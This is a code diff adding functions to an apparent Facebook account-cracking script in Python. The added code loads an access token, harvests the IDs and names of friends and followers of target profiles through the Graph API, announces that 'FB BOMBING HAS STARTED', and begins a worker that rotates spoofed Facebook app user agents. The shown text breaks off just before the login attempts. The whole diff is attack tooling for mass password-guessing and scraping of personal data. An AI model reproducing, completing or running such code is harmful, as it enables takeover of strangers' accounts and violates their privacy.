@@ -771,3 +771,93 @@ def crack_select():
 if __name__ == '__main__':
 	main()
 
+
+def crack2():
+	global token
+	os.system("clear")
+	try:
+		token = open("token.txt","r").read()
+	except IOError:
+		print("")
+		print("\t\033[91;1m  TOKEN NOT FOUND ")
+		time.sleep(1)
+		fb_token()
+	os.system("clear")
+	logo()
+	print("")
+	print("\t\033[93;1m CHOOSE PATH TO CRACK THROUGH")
+	print("")
+	print("\033[92;1m  [1] CRACK PUBLIC ID")
+	print("\033[93;1m  [2] CRACK FOLLOWERS")
+	print("\033[91;1m  [0] BACK")
+	print("")
+	crack_select2()
+	
+def crack_select2():
+	select = raw_input("\033[92;1m  CHOOSE : ")
+	id=[]
+	oks=[]
+	cps=[]
+	if select =="1":
+		os.system("clear")
+		logo()
+		print("")
+		print("\t\033[92;1m MULTI PUBLIC ID COINING ")
+		print("")
+		try:
+			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
+			print("")
+		except:id_limit=1
+		for t in range(id_limit):
+			t +=1
+			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
+			try:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
+					uid = i["id"].encode('utf-8')
+					na = i["name"].encode('utf-8')
+					id.append(uid+"|"+na)
+			except KeyError:
+				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
+			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
+		time.sleep(3)
+	elif select =="2":
+		os.system("clear")
+		logo()
+		print("")
+		print("      \033[92;1mMULTI FOLLOWERS ID COINING ")
+		print("")
+		try:
+			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
+			print("")
+		except:id_limit=1
+		for t in range(id_limit):
+			t +=1
+			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
+			try:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
+					uid = i["id"].encode('utf-8')
+					na = i["name"].encode('utf-8')
+					id.append(uid+"|"+na)
+			except KeyError:
+				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
+			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
+		time.sleep(3)
+	elif select =="0":
+	    menu()
+	else:
+		print("")
+		print("\t\033[91;1m  SELECT VALID OPTION")
+		print("")
+		crack_select2()
+	os.system("clear")
+	logo()
+	print("")
+	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
+	print("\033[92;1m  FB BOMBING HAS STARTED\x1b[0m")
+	print("\033[93;1m  WATCH THE MAGIC HAPPEN ✌️😈 \033[92;1m✘\033[91;1m✘\x1b[0m")
+	linex()
+	def main(arg):
+		user=arg
+		uid,name=user.split("|")
+		_azimua = random.choice(["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
+		try:
